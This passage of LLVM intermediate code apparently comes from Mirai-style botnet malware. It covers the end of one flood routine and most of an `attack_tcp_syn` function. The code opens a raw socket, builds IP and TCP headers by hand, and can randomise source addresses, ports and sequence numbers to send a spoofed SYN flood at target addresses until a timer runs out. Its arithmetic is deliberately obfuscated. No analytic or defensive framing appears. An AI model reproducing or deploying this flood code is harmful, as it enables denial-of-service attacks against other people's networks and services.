  store %struct.sockaddr* %603, %struct.sockaddr** %597, align 8
  %604 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %605 = load %struct.sockaddr*, %struct.sockaddr** %604, align 8
  %606 = call i64 @sendto(i32 %589, i8* %590, i64 %595, i32 16384, %struct.sockaddr* %605, i32 16)
  br label %607

; <label>:607:                                    ; preds = %535
  %608 = load i32, i32* %11, align 4
  %609 = sub i32 %608, -639437082
  %610 = add i32 %609, 1
  %611 = add i32 %610, -639437082
  %612 = add nsw i32 %608, 1
  store i32 %611, i32* %11, align 4
  br label %350

; <label>:613:                                    ; preds = %350
  %614 = call i64 @time(i64* null) #6
  %615 = load i32, i32* %24, align 4
  %616 = sext i32 %615 to i64
  %617 = icmp sgt i64 %614, %616
  br i1 %617, label %618, label %619

; <label>:618:                                    ; preds = %613
  br label %620

; <label>:619:                                    ; preds = %613
  br label %349

; <label>:620:                                    ; preds = %618, %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 24, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = add i64 %99, 7802436974936503512
  %103 = add i64 %102, %101
  %104 = sub i64 %103, 7802436974936503512
  %105 = add nsw i64 %99, %101
  %106 = trunc i64 %104 to i32
  store i32 %106, i32* %29, align 4
  %107 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %107, i32* %12, align 4
  %108 = icmp eq i32 %107, -1
  br i1 %108, label %109, label %110

; <label>:109:                                    ; preds = %5
  br label %645

; <label>:110:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %111 = load i32, i32* %12, align 4
  %112 = bitcast i32* %11 to i8*
  %113 = call i32 @setsockopt(i32 %111, i32 0, i32 3, i8* %112, i32 4) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %118

; <label>:115:                                    ; preds = %110
  %116 = load i32, i32* %12, align 4
  %117 = call i32 @close(i32 %116)
  br label %645

; <label>:118:                                    ; preds = %110
  store i32 0, i32* %11, align 4
  br label %119

; <label>:119:                                    ; preds = %455, %118
  %120 = load i32, i32* %11, align 4
  %121 = load i8, i8* %7, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp slt i32 %120, %122
  br i1 %123, label %124, label %460

; <label>:124:                                    ; preds = %119
  %125 = call noalias i8* @calloc(i64 128, i64 1) #6
  %126 = load i8**, i8*** %13, align 8
  %127 = load i32, i32* %11, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8*, i8** %126, i64 %128
  store i8* %125, i8** %129, align 8
  %130 = load i8**, i8*** %13, align 8
  %131 = load i32, i32* %11, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8*, i8** %130, i64 %132
  %134 = load i8*, i8** %133, align 8
  %135 = bitcast i8* %134 to %struct.iphdr*
  store %struct.iphdr* %135, %struct.iphdr** %30, align 8
  %136 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i64 1
  %138 = bitcast %struct.iphdr* %137 to %struct.tcphdr*
  store %struct.tcphdr* %138, %struct.tcphdr** %31, align 8
  %139 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %140 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %139, i64 1
  %141 = bitcast %struct.tcphdr* %140 to i8*
  store i8* %141, i8** %32, align 8
  %142 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %143 = bitcast %struct.iphdr* %142 to i8*
  %144 = load i8, i8* %143, align 4
  %145 = xor i8 15, -1
  %146 = xor i8 %144, %145
  %147 = and i8 %146, %144
  %148 = and i8 %144, 15
  %149 = xor i8 %147, -1
  %150 = xor i8 64, -1
  %151 = xor i8 -13, -1
  %152 = and i8 %149, -13
  %153 = and i8 %147, %151
  %154 = and i8 %150, -13
  %155 = and i8 64, %151
  %156 = or i8 %152, %153
  %157 = or i8 %154, %155
  %158 = xor i8 %156, %157
  %159 = or i8 %149, %150
  %160 = xor i8 %159, -1
  %161 = or i8 -13, %151
  %162 = and i8 %160, %161
  %163 = or i8 %158, %162
  %164 = or i8 %147, 64
  store i8 %163, i8* %143, align 4
  %165 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %166 = bitcast %struct.iphdr* %165 to i8*
  %167 = load i8, i8* %166, align 4
  %168 = xor i8 %167, -1
  %169 = xor i8 -16, -1
  %170 = xor i8 -42, -1
  %171 = or i8 %168, %169
  %172 = or i8 -42, %170
  %173 = xor i8 %171, -1
  %174 = and i8 %173, %172
  %175 = and i8 %167, -16
  %176 = and i8 %174, 5
  %177 = xor i8 %174, 5
  %178 = or i8 %176, %177
  %179 = or i8 %174, 5
  store i8 %178, i8* %166, align 4
  %180 = load i8, i8* %14, align 1
  %181 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 1
  store i8 %180, i8* %182, align 1
  %183 = call zeroext i16 @htons(i16 zeroext 60) #7
  %184 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 2
  store i16 %183, i16* %185, align 2
  %186 = load i16, i16* %15, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 3
  store i16 %187, i16* %189, align 4
  %190 = load i8, i8* %16, align 1
  %191 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 5
  store i8 %190, i8* %192, align 4
  %193 = load i8, i8* %17, align 1
  %194 = icmp ne i8 %193, 0
  br i1 %194, label %195, label %199

; <label>:195:                                    ; preds = %124
  %196 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %197 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 4
  store i16 %196, i16* %198, align 2
  br label %199

; <label>:199:                                    ; preds = %195, %124
  %200 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 6
  store i8 6, i8* %201, align 1
  %202 = load i32, i32* %28, align 4
  %203 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 8
  store i32 %202, i32* %204, align 4
  %205 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %206 = load i32, i32* %11, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 1
  %210 = load i32, i32* %209, align 4
  %211 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 9
  store i32 %210, i32* %212, align 4
  %213 = load i16, i16* %18, align 2
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %216 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %215, i32 0, i32 0
  store i16 %214, i16* %216, align 4
  %217 = load i16, i16* %19, align 2
  %218 = call zeroext i16 @htons(i16 zeroext %217) #7
  %219 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 1
  store i16 %218, i16* %220, align 2
  %221 = load i32, i32* %20, align 4
  %222 = trunc i32 %221 to i16
  %223 = call zeroext i16 @htons(i16 zeroext %222) #7
  %224 = zext i16 %223 to i32
  %225 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 2
  store i32 %224, i32* %226, align 4
  %227 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = xor i16 -241, -1
  %231 = xor i16 %229, %230
  %232 = and i16 %231, %229
  %233 = and i16 %229, -241
  %234 = and i16 %232, 160
  %235 = xor i16 %232, 160
  %236 = or i16 %234, %235
  %237 = or i16 %232, 160
  store i16 %236, i16* %228, align 4
  %238 = load i8, i8* %22, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = xor i16 1, -1
  %244 = xor i16 %239, %243
  %245 = and i16 %244, %239
  %246 = and i16 %239, 1
  %247 = shl i16 %245, 13
  %248 = xor i16 -8193, -1
  %249 = xor i16 %242, %248
  %250 = and i16 %249, %242
  %251 = and i16 %242, -8193
  %252 = xor i16 %250, -1
  %253 = xor i16 %247, -1
  %254 = xor i16 -12572, -1
  %255 = and i16 %252, -12572
  %256 = and i16 %250, %254
  %257 = and i16 %253, -12572
  %258 = and i16 %247, %254
  %259 = or i16 %255, %256
  %260 = or i16 %257, %258
  %261 = xor i16 %259, %260
  %262 = or i16 %252, %253
  %263 = xor i16 %262, -1
  %264 = or i16 -12572, %254
  %265 = and i16 %263, %264
  %266 = or i16 %261, %265
  %267 = or i16 %250, %247
  store i16 %266, i16* %241, align 4
  %268 = load i8, i8* %23, align 1
  %269 = sext i8 %268 to i16
  %270 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 4
  %272 = load i16, i16* %271, align 4
  %273 = xor i16 %269, -1
  %274 = xor i16 1, -1
  %275 = xor i16 5590, -1
  %276 = or i16 %273, %274
  %277 = or i16 5590, %275
  %278 = xor i16 %276, -1
  %279 = and i16 %278, %277
  %280 = and i16 %269, 1
  %281 = shl i16 %279, 12
  %282 = xor i16 -4097, -1
  %283 = xor i16 %272, %282
  %284 = and i16 %283, %272
  %285 = and i16 %272, -4097
  %286 = and i16 %284, %281
  %287 = xor i16 %284, %281
  %288 = or i16 %286, %287
  %289 = or i16 %284, %281
  store i16 %288, i16* %271, align 4
  %290 = load i8, i8* %24, align 1
  %291 = sext i8 %290 to i16
  %292 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 4
  %294 = load i16, i16* %293, align 4
  %295 = xor i16 1, -1
  %296 = xor i16 %291, %295
  %297 = and i16 %296, %291
  %298 = and i16 %291, 1
  %299 = shl i16 %297, 11
  %300 = xor i16 %294, -1
  %301 = xor i16 -2049, -1
  %302 = xor i16 -18554, -1
  %303 = or i16 %300, %301
  %304 = or i16 -18554, %302
  %305 = xor i16 %303, -1
  %306 = and i16 %305, %304
  %307 = and i16 %294, -2049
  %308 = and i16 %306, %299
  %309 = xor i16 %306, %299
  %310 = or i16 %308, %309
  %311 = or i16 %306, %299
  store i16 %310, i16* %293, align 4
  %312 = load i8, i8* %25, align 1
  %313 = sext i8 %312 to i16
  %314 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 4
  %316 = load i16, i16* %315, align 4
  %317 = xor i16 %313, -1
  %318 = xor i16 1, -1
  %319 = xor i16 -7141, -1
  %320 = or i16 %317, %318
  %321 = or i16 -7141, %319
  %322 = xor i16 %320, -1
  %323 = and i16 %322, %321
  %324 = and i16 %313, 1
  %325 = shl i16 %323, 10
  %326 = xor i16 -1025, -1
  %327 = xor i16 %316, %326
  %328 = and i16 %327, %316
  %329 = and i16 %316, -1025
  %330 = xor i16 %328, -1
  %331 = xor i16 %325, -1
  %332 = xor i16 26196, -1
  %333 = and i16 %330, 26196
  %334 = and i16 %328, %332
  %335 = and i16 %331, 26196
  %336 = and i16 %325, %332
  %337 = or i16 %333, %334
  %338 = or i16 %335, %336
  %339 = xor i16 %337, %338
  %340 = or i16 %330, %331
  %341 = xor i16 %340, -1
  %342 = or i16 26196, %332
  %343 = and i16 %341, %342
  %344 = or i16 %339, %343
  %345 = or i16 %328, %325
  store i16 %344, i16* %315, align 4
  %346 = load i8, i8* %26, align 1
  %347 = sext i8 %346 to i16
  %348 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = xor i16 1, -1
  %352 = xor i16 %347, %351
  %353 = and i16 %352, %347
  %354 = and i16 %347, 1
  %355 = shl i16 %353, 9
  %356 = xor i16 %350, -1
  %357 = xor i16 -513, -1
  %358 = xor i16 -1500, -1
  %359 = or i16 %356, %357
  %360 = or i16 -1500, %358
  %361 = xor i16 %359, -1
  %362 = and i16 %361, %360
  %363 = and i16 %350, -513
  %364 = and i16 %362, %355
  %365 = xor i16 %362, %355
  %366 = or i16 %364, %365
  %367 = or i16 %362, %355
  store i16 %366, i16* %349, align 4
  %368 = load i8, i8* %27, align 1
  %369 = sext i8 %368 to i16
  %370 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 4
  %372 = load i16, i16* %371, align 4
  %373 = xor i16 %369, -1
  %374 = xor i16 1, -1
  %375 = xor i16 -7759, -1
  %376 = or i16 %373, %374
  %377 = or i16 -7759, %375
  %378 = xor i16 %376, -1
  %379 = and i16 %378, %377
  %380 = and i16 %369, 1
  %381 = shl i16 %379, 8
  %382 = xor i16 %372, -1
  %383 = xor i16 -257, -1
  %384 = xor i16 -851, -1
  %385 = or i16 %382, %383
  %386 = or i16 -851, %384
  %387 = xor i16 %385, -1
  %388 = and i16 %387, %386
  %389 = and i16 %372, -257
  %390 = xor i16 %388, -1
  %391 = xor i16 %381, -1
  %392 = xor i16 -25079, -1
  %393 = and i16 %390, -25079
  %394 = and i16 %388, %392
  %395 = and i16 %391, -25079
  %396 = and i16 %381, %392
  %397 = or i16 %393, %394
  %398 = or i16 %395, %396
  %399 = xor i16 %397, %398
  %400 = or i16 %390, %391
  %401 = xor i16 %400, -1
  %402 = or i16 -25079, %392
  %403 = and i16 %401, %402
  %404 = or i16 %399, %403
  %405 = or i16 %388, %381
  store i16 %404, i16* %371, align 4
  %406 = load i8*, i8** %32, align 8
  %407 = getelementptr inbounds i8, i8* %406, i32 1
  store i8* %407, i8** %32, align 8
  store i8 2, i8* %406, align 1
  %408 = load i8*, i8** %32, align 8
  %409 = getelementptr inbounds i8, i8* %408, i32 1
  store i8* %409, i8** %32, align 8
  store i8 4, i8* %408, align 1
  %410 = call i32 @rand_next()
  %411 = xor i32 %410, -1
  %412 = xor i32 15, -1
  %413 = xor i32 1958618277, -1
  %414 = or i32 %411, %412
  %415 = or i32 1958618277, %413
  %416 = xor i32 %414, -1
  %417 = and i32 %416, %415
  %418 = and i32 %410, 15
  %419 = sub i32 0, 1400
  %420 = sub i32 0, %417
  %421 = add i32 %419, %420
  %422 = sub i32 0, %421
  %423 = add i32 1400, %417
  %424 = trunc i32 %422 to i16
  %425 = call zeroext i16 @htons(i16 zeroext %424) #7
  %426 = load i8*, i8** %32, align 8
  %427 = bitcast i8* %426 to i16*
  store i16 %425, i16* %427, align 2
  %428 = load i8*, i8** %32, align 8
  %429 = getelementptr inbounds i8, i8* %428, i64 2
  store i8* %429, i8** %32, align 8
  %430 = load i8*, i8** %32, align 8
  %431 = getelementptr inbounds i8, i8* %430, i32 1
  store i8* %431, i8** %32, align 8
  store i8 4, i8* %430, align 1
  %432 = load i8*, i8** %32, align 8
  %433 = getelementptr inbounds i8, i8* %432, i32 1
  store i8* %433, i8** %32, align 8
  store i8 2, i8* %432, align 1
  %434 = load i8*, i8** %32, align 8
  %435 = getelementptr inbounds i8, i8* %434, i32 1
  store i8* %435, i8** %32, align 8
  store i8 8, i8* %434, align 1
  %436 = load i8*, i8** %32, align 8
  %437 = getelementptr inbounds i8, i8* %436, i32 1
  store i8* %437, i8** %32, align 8
  store i8 10, i8* %436, align 1
  %438 = call i32 @rand_next()
  %439 = load i8*, i8** %32, align 8
  %440 = bitcast i8* %439 to i32*
  store i32 %438, i32* %440, align 4
  %441 = load i8*, i8** %32, align 8
  %442 = getelementptr inbounds i8, i8* %441, i64 4
  store i8* %442, i8** %32, align 8
  %443 = load i8*, i8** %32, align 8
  %444 = bitcast i8* %443 to i32*
  store i32 0, i32* %444, align 4
  %445 = load i8*, i8** %32, align 8
  %446 = getelementptr inbounds i8, i8* %445, i64 4
  store i8* %446, i8** %32, align 8
  %447 = load i8*, i8** %32, align 8
  %448 = getelementptr inbounds i8, i8* %447, i32 1
  store i8* %448, i8** %32, align 8
  store i8 1, i8* %447, align 1
  %449 = load i8*, i8** %32, align 8
  %450 = getelementptr inbounds i8, i8* %449, i32 1
  store i8* %450, i8** %32, align 8
  store i8 3, i8* %449, align 1
  %451 = load i8*, i8** %32, align 8
  %452 = getelementptr inbounds i8, i8* %451, i32 1
  store i8* %452, i8** %32, align 8
  store i8 3, i8* %451, align 1
  %453 = load i8*, i8** %32, align 8
  %454 = getelementptr inbounds i8, i8* %453, i32 1
  store i8* %454, i8** %32, align 8
  store i8 6, i8* %453, align 1
  br label %455

; <label>:455:                                    ; preds = %199
  %456 = load i32, i32* %11, align 4
  %457 = sub i32 0, 1
  %458 = sub i32 %456, %457
  %459 = add nsw i32 %456, 1
  store i32 %458, i32* %11, align 4
  br label %119

; <label>:460:                                    ; preds = %119
  br label %461

; <label>:461:                                    ; preds = %644, %460
  store i32 0, i32* %11, align 4
  br label %462

; <label>:462:                                    ; preds = %632, %461
  %463 = load i32, i32* %11, align 4
  %464 = load i8, i8* %7, align 1
  %465 = zext i8 %464 to i32
  %466 = icmp slt i32 %463, %465
  br i1 %466, label %467, label %638

; <label>:467:                                    ; preds = %462
  %468 = load i8**, i8*** %13, align 8
  %469 = load i32, i32* %11, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds i8*, i8** %468, i64 %470
  %472 = load i8*, i8** %471, align 8
  store i8* %472, i8** %33, align 8
  %473 = load i8*, i8** %33, align 8
  %474 = bitcast i8* %473 to %struct.iphdr*
  store %struct.iphdr* %474, %struct.iphdr** %34, align 8
  %475 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i64 1
  %477 = bitcast %struct.iphdr* %476 to %struct.tcphdr*
  store %struct.tcphdr* %477, %struct.tcphdr** %35, align 8
  %478 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %479 = load i32, i32* %11, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i64 %480
  %482 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %481, i32 0, i32 2
  %483 = load i8, i8* %482, align 4
  %484 = zext i8 %483 to i32
  %485 = icmp slt i32 %484, 32
  br i1 %485, label %486, label %510

; <label>:486:                                    ; preds = %467
  %487 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %488 = load i32, i32* %11, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i64 %489
  %491 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %490, i32 0, i32 1
  %492 = load i32, i32* %491, align 4
  %493 = call i32 @ntohl(i32 %492) #7
  %494 = call i32 @rand_next()
  %495 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %496 = load i32, i32* %11, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %495, i64 %497
  %499 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %498, i32 0, i32 2
  %500 = load i8, i8* %499, align 4
  %501 = zext i8 %500 to i32
  %502 = lshr i32 %494, %501
  %503 = sub i32 %493, 130980049
  %504 = add i32 %503, %502
  %505 = add i32 %504, 130980049
  %506 = add i32 %493, %502
  %507 = call i32 @htonl(i32 %505) #7
  %508 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 9
  store i32 %507, i32* %509, align 4
  br label %510

; <label>:510:                                    ; preds = %486, %467
  %511 = load i32, i32* %28, align 4
  %512 = icmp eq i32 %511, -1
  br i1 %512, label %513, label %517

; <label>:513:                                    ; preds = %510
  %514 = call i32 @rand_next()
  %515 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %516 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %515, i32 0, i32 8
  store i32 %514, i32* %516, align 4
  br label %517

; <label>:517:                                    ; preds = %513, %510
  %518 = load i16, i16* %15, align 2
  %519 = zext i16 %518 to i32
  %520 = icmp eq i32 %519, 65535
  br i1 %520, label %521, label %534

; <label>:521:                                    ; preds = %517
  %522 = call i32 @rand_next()
  %523 = xor i32 %522, -1
  %524 = xor i32 65535, -1
  %525 = xor i32 -1523221619, -1
  %526 = or i32 %523, %524
  %527 = or i32 -1523221619, %525
  %528 = xor i32 %526, -1
  %529 = and i32 %528, %527
  %530 = and i32 %522, 65535
  %531 = trunc i32 %529 to i16
  %532 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 3
  store i16 %531, i16* %533, align 4
  br label %534

; <label>:534:                                    ; preds = %521, %517
  %535 = load i16, i16* %18, align 2
  %536 = zext i16 %535 to i32
  %537 = icmp eq i32 %536, 65535
  br i1 %537, label %538, label %547

; <label>:538:                                    ; preds = %534
  %539 = call i32 @rand_next()
  %540 = xor i32 65535, -1
  %541 = xor i32 %539, %540
  %542 = and i32 %541, %539
  %543 = and i32 %539, 65535
  %544 = trunc i32 %542 to i16
  %545 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %546 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %545, i32 0, i32 0
  store i16 %544, i16* %546, align 4
  br label %547

; <label>:547:                                    ; preds = %538, %534
  %548 = load i16, i16* %19, align 2
  %549 = zext i16 %548 to i32
  %550 = icmp eq i32 %549, 65535
  br i1 %550, label %551, label %564

; <label>:551:                                    ; preds = %547
  %552 = call i32 @rand_next()
  %553 = xor i32 %552, -1
  %554 = xor i32 65535, -1
  %555 = xor i32 832866599, -1
  %556 = or i32 %553, %554
  %557 = or i32 832866599, %555
  %558 = xor i32 %556, -1
  %559 = and i32 %558, %557
  %560 = and i32 %552, 65535
  %561 = trunc i32 %559 to i16
  %562 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 1
  store i16 %561, i16* %563, align 2
  br label %564

; <label>:564:                                    ; preds = %551, %547
  %565 = load i32, i32* %20, align 4
  %566 = icmp eq i32 %565, 65535
  br i1 %566, label %567, label %571

; <label>:567:                                    ; preds = %564
  %568 = call i32 @rand_next()
  %569 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %570 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %569, i32 0, i32 2
  store i32 %568, i32* %570, align 4
  br label %571

; <label>:571:                                    ; preds = %567, %564
  %572 = load i32, i32* %21, align 4
  %573 = icmp eq i32 %572, 65535
  br i1 %573, label %574, label %578

; <label>:574:                                    ; preds = %571
